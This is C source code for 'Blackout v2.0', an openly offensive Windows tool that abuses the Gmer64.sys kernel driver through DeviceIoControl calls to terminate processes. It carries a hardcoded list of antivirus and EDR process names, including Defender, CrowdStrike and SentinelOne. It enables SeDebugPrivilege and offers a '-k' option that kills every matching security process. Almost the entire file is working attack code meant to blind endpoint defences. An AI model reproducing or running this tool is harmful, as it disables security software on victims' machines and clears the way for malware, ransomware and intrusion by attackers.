#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <winsvc.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ntdll.lib")

// Gmer64.sys Device IO Control Codes
#define INITIALIZE_IOCTL_CODE     0x9876C008
#define TERMINATE_PROCESS_IOCTL_CODE 0x9876C098

// Alternative IOCTL codes to try
#define INITIALIZE_IOCTL_CODE_ALT1     0x9876C004
#define INITIALIZE_IOCTL_CODE_ALT2     0x9876C000
#define INITIALIZE_IOCTL_CODE_ALT3     0x9876C010
#define TERMINATE_PROCESS_IOCTL_CODE_ALT1 0x9876C094
#define TERMINATE_PROCESS_IOCTL_CODE_ALT2 0x9876C090
#define TERMINATE_PROCESS_IOCTL_CODE_ALT3 0x9876C0A0

// Predefined EDR Process List
static const char* edrList[] = {
    "360tray.exe", "360Safe.exe", "360leakfixer.exe", "ZhuDongFangYu.exe",
    "HipsDaemon.exe", "HipsTray.exe", "PopBlock.exe", "wsctrlsvc.exe",
    "redcloak", "secureworks", "securityhealthservice",
    "MsMpEng.exe", "NisSrv.exe", "ScepAgent.exe", "McShield.exe",
    "McTray.exe", "McUICnt.exe", "McProxy.exe", "McScript_InUse.exe",
    "Symantec", "Norton", "Kaspersky", "Bitdefender", "Avast",
    "AVG", "TrendMicro", "Sophos", "CrowdStrike", "SentinelOne",
    "CarbonBlack", "Cylance", "FireEye", "PaloAlto", "CheckPoint",
    "Fortinet", "Cisco", "Microsoft Defender", "Windows Defender",
    "Defender", "MsSense", "Sense", "MDE", "ATP", "EDR"
};

#define EDR_LIST_SIZE (sizeof(edrList) / sizeof(edrList[0]))

// Color Definitions
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN    "\033[36m"
#define WHITE   "\033[37m"
#define RESET   "\033[0m"

// Log Levels
typedef enum {
    LOG_INFO,
    LOG_WARNING,
    LOG_ERROR,
    LOG_SUCCESS
} LogLevel;

// Global Variables
static HANDLE g_hDevice = INVALID_HANDLE_VALUE;
static BOOL g_verbose = FALSE;

// Function Declarations
BOOL IsInEdrList(const WCHAR* processName);
void LogMessage(LogLevel level, const char* format, ...);
BOOL InitializeDriver(void);
BOOL TerminateProcessByPid(DWORD pid);
BOOL ListProcesses(void);
BOOL KillEdrProcesses(void);
BOOL KillProcessByName(const char* processName);
DWORD GetProcessIdByName(const char* processName);
void PrintBanner(void);
void PrintUsage(const char* programName);
BOOL EnableDebugPrivilege(void);
void Cleanup(void);
BOOL CheckDriverLoaded(void);
BOOL TestDriverConnection(void);

// Check if process is in EDR list
BOOL IsInEdrList(const WCHAR* processName) {
    if (!processName) return FALSE;

    WCHAR lowerProcessName[MAX_PATH];
    wcscpy_s(lowerProcessName, sizeof(lowerProcessName) / sizeof(WCHAR), processName);
    _wcslwr_s(lowerProcessName, sizeof(lowerProcessName) / sizeof(WCHAR));

    for (size_t i = 0; i < EDR_LIST_SIZE; i++) {
        // Convert ANSI string to wide string for comparison
        WCHAR wideEdrName[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, edrList[i], -1, wideEdrName, MAX_PATH);
        if (wcsstr(lowerProcessName, wideEdrName) != NULL) {
            return TRUE;
        }
    }
    return FALSE;
}

// Log Output Function
void LogMessage(LogLevel level, const char* format, ...) {
    va_list args;
    va_start(args, format);

    const char* color = RESET;
    const char* prefix = "";

    switch (level) {
    case LOG_INFO:
        color = BLUE;
        prefix = "[INFO]";
        break;
    case LOG_WARNING:
        color = YELLOW;
        prefix = "[WARN]";
        break;
    case LOG_ERROR:
        color = RED;
        prefix = "[ERROR]";
        break;
    case LOG_SUCCESS:
        color = GREEN;
        prefix = "[SUCCESS]";
        break;
    }

    printf("%s%s ", color, prefix);
    vprintf(format, args);
    printf("%s\n", RESET);

    va_end(args);
}

// Initialize Driver
BOOL InitializeDriver(void) {
    // Try different device names
    const char* deviceNames[] = {
        "\\\\.\\gmer",
        "\\\\.\\gmer64",
        "\\\\.\\Gmer64",
        "\\\\.\\GMER64"
    };
    
    int numDevices = sizeof(deviceNames) / sizeof(deviceNames[0]);
    
    for (int i = 0; i < numDevices; i++) {
        g_hDevice = CreateFileA(
            deviceNames[i],
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (g_hDevice != INVALID_HANDLE_VALUE) {
            LogMessage(LOG_INFO, "Connected to device: %s", deviceNames[i]);
            break;
        }
    }

    if (g_hDevice == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        LogMessage(LOG_ERROR, "Failed to open device driver, error code: 0x%08X", error);
        LogMessage(LOG_ERROR, "Make sure Gmer64.sys driver is loaded and running");
        return FALSE;
    }

    // Try different IOCTL codes for initialization
    DWORD ioctlCodes[] = {
        INITIALIZE_IOCTL_CODE,
        INITIALIZE_IOCTL_CODE_ALT1,
        INITIALIZE_IOCTL_CODE_ALT2,
        INITIALIZE_IOCTL_CODE_ALT3
    };
    
    const char* ioctlNames[] = {
        "INITIALIZE_IOCTL_CODE",
        "INITIALIZE_IOCTL_CODE_ALT1", 
        "INITIALIZE_IOCTL_CODE_ALT2",
        "INITIALIZE_IOCTL_CODE_ALT3"
    };
    
    int numCodes = sizeof(ioctlCodes) / sizeof(ioctlCodes[0]);
    BOOL success = FALSE;
    DWORD workingCode = 0;
    
    for (int i = 0; i < numCodes; i++) {
        DWORD input = 0; // Initialize does not require specific parameters
        DWORD output[2] = { 0 };
        DWORD bytesReturned = 0;

        LogMessage(LOG_INFO, "Trying IOCTL code: 0x%08X (%s)", ioctlCodes[i], ioctlNames[i]);
        
        BOOL result = DeviceIoControl(
            g_hDevice,
            ioctlCodes[i],
            &input,
            sizeof(DWORD),
            output,
            sizeof(output),
            &bytesReturned,
            NULL
        );

        if (result) {
            LogMessage(LOG_SUCCESS, "Driver initialized successfully with IOCTL: 0x%08X (%s)", 
                      ioctlCodes[i], ioctlNames[i]);
            workingCode = ioctlCodes[i];
            success = TRUE;
            break;
        } else {
            DWORD error = GetLastError();
            LogMessage(LOG_WARNING, "IOCTL 0x%08X failed with error: 0x%08X", ioctlCodes[i], error);
        }
    }

    if (!success) {
        LogMessage(LOG_ERROR, "All IOCTL codes failed. Driver may not be compatible or not responding.");
        LogMessage(LOG_ERROR, "Please check if the driver is properly loaded and supports these IOCTL codes.");
        CloseHandle(g_hDevice);
        g_hDevice = INVALID_HANDLE_VALUE;
        return FALSE;
    }

    return TRUE;
}

// Terminate process by PID
BOOL TerminateProcessByPid(DWORD pid) {
    if (g_hDevice == INVALID_HANDLE_VALUE) {
        LogMessage(LOG_ERROR, "Device not initialized");
        return FALSE;
    }

    // Try different IOCTL codes for process termination
    DWORD ioctlCodes[] = {
        TERMINATE_PROCESS_IOCTL_CODE,
        TERMINATE_PROCESS_IOCTL_CODE_ALT1,
        TERMINATE_PROCESS_IOCTL_CODE_ALT2,
        TERMINATE_PROCESS_IOCTL_CODE_ALT3
    };
    
    const char* ioctlNames[] = {
        "TERMINATE_PROCESS_IOCTL_CODE",
        "TERMINATE_PROCESS_IOCTL_CODE_ALT1",
        "TERMINATE_PROCESS_IOCTL_CODE_ALT2", 
        "TERMINATE_PROCESS_IOCTL_CODE_ALT3"
    };
    
    int numCodes = sizeof(ioctlCodes) / sizeof(ioctlCodes[0]);
    DWORD input = pid;
    DWORD bytesReturned = 0;

    for (int i = 0; i < numCodes; i++) {
        LogMessage(LOG_INFO, "Trying terminate IOCTL code: 0x%08X (%s)", ioctlCodes[i], ioctlNames[i]);
        
        BOOL result = DeviceIoControl(
            g_hDevice,
            ioctlCodes[i],
            &input,
            sizeof(DWORD),
            NULL,
            0,
            &bytesReturned,
            NULL
        );

        if (result) {
            LogMessage(LOG_SUCCESS, "Process terminated successfully (PID: %lu) with IOCTL: 0x%08X", 
                      pid, ioctlCodes[i]);
            return TRUE;
        } else {
            DWORD error = GetLastError();
            LogMessage(LOG_WARNING, "Terminate IOCTL 0x%08X failed with error: 0x%08X", ioctlCodes[i], error);
        }
    }

    LogMessage(LOG_ERROR, "All terminate IOCTL codes failed for PID: %lu", pid);
    return FALSE;
}

// List all processes
BOOL ListProcesses(void) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        LogMessage(LOG_ERROR, "Failed to create process snapshot");
        return FALSE;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        LogMessage(LOG_ERROR, "Failed to get first process");
        CloseHandle(hSnapshot);
        return FALSE;
    }

    printf("\n%sProcess List:%s\n", CYAN, RESET);
    printf("%-8s %-30s %s\n", "PID", "Process Name", "EDR Flag");
    printf("----------------------------------------\n");

    do {
        BOOL isEdr = IsInEdrList(pe32.szExeFile);
        // Convert wide char to ANSI for printf
        char ansiProcessName[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, ansiProcessName, MAX_PATH, NULL, NULL);
        printf("%-8lu %-30s %s\n",
            pe32.th32ProcessID,
            ansiProcessName,
            isEdr ? "Yes" : "No");
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return TRUE;
}

// Terminate all EDR processes
BOOL KillEdrProcesses(void) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        LogMessage(LOG_ERROR, "Failed to create process snapshot");
        return FALSE;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        LogMessage(LOG_ERROR, "Failed to get first process");
        CloseHandle(hSnapshot);
        return FALSE;
    }

    int killedCount = 0;

    do {
        if (IsInEdrList(pe32.szExeFile)) {
            // Convert wide char to ANSI for LogMessage
            char ansiProcessName[MAX_PATH];
            WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, ansiProcessName, MAX_PATH, NULL, NULL);
            LogMessage(LOG_INFO, "Found EDR process: %s (PID: %lu)", ansiProcessName, pe32.th32ProcessID);
            if (TerminateProcessByPid(pe32.th32ProcessID)) {
                killedCount++;
            }
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);

    if (killedCount > 0) {
        LogMessage(LOG_SUCCESS, "Successfully terminated %d EDR processes", killedCount);
    }
    else {
        LogMessage(LOG_INFO, "No EDR processes found");
    }

    return TRUE;
}

// Terminate process by name
BOOL KillProcessByName(const char* processName) {
    DWORD pid = GetProcessIdByName(processName);
    if (pid == 0) {
        LogMessage(LOG_WARNING, "Process not found: %s", processName);
        return FALSE;
    }

    return TerminateProcessByPid(pid);
}

// Get PID by process name
DWORD GetProcessIdByName(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        // Convert wide char to ANSI for comparison
        char ansiProcessName[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, ansiProcessName, MAX_PATH, NULL, NULL);
        if (_stricmp(ansiProcessName, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

// Print Banner
void PrintBanner(void) {
    printf("%s", CYAN);
    printf("+===============================================================+\n");
    printf("|                    Blackout v2.0 - C Edition                |\n");
    printf("|               EDR Process Termination Tool                  |\n");
    printf("|                    Powered by Gmer64.sys                    |\n");
    printf("+===============================================================+\n");
    printf("%s", RESET);
}

// Print Usage Instructions
void PrintUsage(const char* programName) {
    printf("Usage: %s [options] [arguments]\n\n", programName);
    printf("Options:\n");
    printf("  -p <PID>           Terminate process with specified PID\n");
    printf("  -n <process_name>  Terminate process with specified name\n");
    printf("  -l                 List all processes\n");
    printf("  -k                 Terminate all EDR processes\n");
    printf("  -t                 Test driver connection\n");
    printf("  -v                 Verbose output\n");
    printf("  -h                 Show this help information\n\n");
    printf("Examples:\n");
    printf("  %s -p 1234         Terminate process with PID 1234\n", programName);
    printf("  %s -n notepad.exe  Terminate notepad.exe process\n", programName);
    printf("  %s -l              List all processes\n", programName);
    printf("  %s -k              Terminate all EDR processes\n", programName);
    printf("  %s -t              Test driver connection\n", programName);
}

// Enable Debug Privilege
BOOL EnableDebugPrivilege(void) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    LUID luid;
    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    return result;
}

// Check if driver is loaded
BOOL CheckDriverLoaded(void) {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager == NULL) {
        return FALSE;
    }

    SC_HANDLE hService = OpenService(hSCManager, "gmer", SERVICE_QUERY_STATUS);
    if (hService == NULL) {
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    SERVICE_STATUS serviceStatus;
    BOOL result = QueryServiceStatus(hService, &serviceStatus);
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    if (result && serviceStatus.dwCurrentState == SERVICE_RUNNING) {
        return TRUE;
    }

    return FALSE;
}

// Test driver connection
BOOL TestDriverConnection(void) {
    LogMessage(LOG_INFO, "Testing driver connection...");
    
    if (InitializeDriver()) {
        LogMessage(LOG_SUCCESS, "Driver connection test successful!");
        Cleanup();
        return TRUE;
    } else {
        LogMessage(LOG_ERROR, "Driver connection test failed!");
        return FALSE;
    }
}

// Cleanup Resources
void Cleanup(void) {
    if (g_hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hDevice);
        g_hDevice = INVALID_HANDLE_VALUE;
    }
}

// Main Function
int main(int argc, char* argv[]) {
    PrintBanner();

    if (argc < 2) {
        PrintUsage(argv[0]);
        return 1;
    }

    // Parse command line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            PrintUsage(argv[0]);
            return 0;
        }
        else if (strcmp(argv[i], "-v") == 0) {
            g_verbose = TRUE;
        }
        else if (strcmp(argv[i], "-l") == 0) {
            if (!ListProcesses()) {
                return 1;
            }
            return 0;
        }
        else if (strcmp(argv[i], "-t") == 0) {
            if (!TestDriverConnection()) {
                return 1;
            }
            return 0;
        }
        else if (strcmp(argv[i], "-k") == 0) {
            if (!EnableDebugPrivilege()) {
                LogMessage(LOG_WARNING, "Failed to enable debug privilege, may not be able to terminate some processes");
            }

            if (!InitializeDriver()) {
                return 1;
            }

            if (!KillEdrProcesses()) {
                Cleanup();
                return 1;
            }

            Cleanup();
            return 0;
        }
        else if (strcmp(argv[i], "-p") == 0) {
            if (i + 1 >= argc) {
                LogMessage(LOG_ERROR, "Missing PID argument");
                return 1;
            }

            DWORD pid = (DWORD)strtoul(argv[++i], NULL, 10);
            if (pid == 0) {
                LogMessage(LOG_ERROR, "Invalid PID: %s", argv[i]);
                return 1;
            }

            if (!EnableDebugPrivilege()) {
                LogMessage(LOG_WARNING, "Failed to enable debug privilege, may not be able to terminate some processes");
            }

            if (!InitializeDriver()) {
                return 1;
            }

            if (!TerminateProcessByPid(pid)) {
                Cleanup();
                return 1;
            }

            Cleanup();
            return 0;
        }
        else if (strcmp(argv[i], "-n") == 0) {
            if (i + 1 >= argc) {
                LogMessage(LOG_ERROR, "Missing process name argument");
                return 1;
            }

            const char* processName = argv[++i];

            if (!EnableDebugPrivilege()) {
                LogMessage(LOG_WARNING, "Failed to enable debug privilege, may not be able to terminate some processes");
            }

            if (!InitializeDriver()) {
                return 1;
            }

            if (!KillProcessByName(processName)) {
                Cleanup();
                return 1;
            }

            Cleanup();
            return 0;
        }
        else {
            LogMessage(LOG_ERROR, "Unknown argument: %s", argv[i]);
            PrintUsage(argv[0]);
            return 1;
        }
    }

    return 0;
}